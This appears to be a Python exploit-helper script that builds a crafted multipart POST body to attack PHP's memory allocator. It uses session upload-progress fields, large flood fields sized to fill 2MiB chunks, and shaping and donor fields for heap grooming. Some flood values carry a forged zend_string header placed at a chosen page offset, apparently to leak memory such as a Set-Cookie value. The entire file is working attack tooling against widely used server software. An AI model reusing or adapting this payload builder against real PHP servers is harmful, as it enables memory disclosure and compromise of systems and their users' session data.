#!/usr/bin/env python3
"""Build the chunked-flood B body for the display_errors=Off Set-Cookie read.

Layout (order matters):
  1. PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS  (enable END-cleanup init)
  2. flood fields: long-name values of VL bytes that take a whole 2MiB chunk
  3. small shaping fields (consumers with 8-char names -> bin-40 keys)
  4. donor fields (name/value 32..39 -> bin-40 temporaries)
"""
from __future__ import annotations

import argparse
import struct


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", required=True)
    ap.add_argument("--sid", default="a" * 32)
    ap.add_argument("--progress", default="k0")
    ap.add_argument("--boundary", default="C" * 10)
    ap.add_argument("--flood", type=int, default=0)
    ap.add_argument("--flood-len", type=int, default=1900000)
    ap.add_argument("--flood-name-len", type=int, default=120)
    ap.add_argument("--consumers", type=int, default=0)
    ap.add_argument("--consumer-name-len", type=int, default=8)
    ap.add_argument("--donors", type=int, default=0)
    ap.add_argument("--donor-len", type=int, default=35)
    ap.add_argument("--forge-page", type=lambda x: int(x, 0), default=0,
                    help="page index in the chunk where the fake id header lands")
    ap.add_argument("--forge-len", type=lambda x: int(x, 0), default=0,
                    help="fake zend_string len at the id")
    ap.add_argument("--forge-write", type=lambda x: int(x, 0), default=0x80,
                    help="bytes written after the fake header")
    ap.add_argument("--forge-count", type=int, default=0,
                    help="how many flood fields carry the forged payload")
    args = ap.parse_args()

    boundary = args.boundary.encode()
    out = bytearray()

    def part(name: bytes, value: bytes) -> None:
        out.extend(b"--" + boundary + b"\r\nContent-Disposition: form-data; name=\"" +
                   name + b"\"\r\n\r\n" + value + b"\r\n")

    part(b"PHPSESSID", args.sid.encode())
    part(b"PHP_SESSION_UPLOAD_PROGRESS", args.progress.encode())

    # Build the flood payload.  A value is an LRUN starting at page 1 of a
    # fresh chunk: data starts at chunk+0x1000+0x18.  To put a fake
    # zend_string header at chunk + page*0x1000, write it at data offset
    # D-0x18 where D = page*0x1000 - 0x1000.
    base = bytearray(b"A" * args.flood_len)
    if args.forge_len and args.forge_page:
        D = args.forge_page * 0x1000 - 0x1000
        hdr = D - 0x18  # value-data offset of the fake zend_string struct
        if 0 <= hdr and hdr + 0x18 + args.forge_write <= args.flood_len:
            struct.pack_into("<I", base, hdr + 0x00, 0)          # refcount
            struct.pack_into("<I", base, hdr + 0x04, 0x16)       # type (string)
            struct.pack_into("<Q", base, hdr + 0x08, 0)          # h
            struct.pack_into("<Q", base, hdr + 0x10, args.forge_len)  # len
            struct.pack_into("<Q", base, hdr + 0x18, 0x4242424242424242)  # 'BBBBBBBB'
    flood = bytes(base)

    for i in range(args.flood):
        v = flood if i < args.forge_count else b"B" * args.flood_len
        name = (b"f%04d" % i).ljust(args.flood_name_len, b"f")[:args.flood_name_len]
        part(name, v)

    for i in range(args.consumers):
        name = (b"c%04d" % i).ljust(args.consumer_name_len, b"c")[:args.consumer_name_len]
        part(name, b"v")

    for i in range(args.donors):
        name = (b"d%04d" % i).ljust(args.donor_len, b"d")[:args.donor_len]
        part(name, b"D" * args.donor_len)

    out.extend(b"--" + boundary + b"--\r\n")
    with open(args.out, "wb") as fh:
        fh.write(bytes(out))
    print("body=%d parts=%d flood=%d forge=%s/%d page=%#x len=%#x" % (
        len(out), 2 + args.flood + args.consumers + args.donors,
        args.flood, args.forge_count, args.flood, args.forge_page, args.forge_len))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
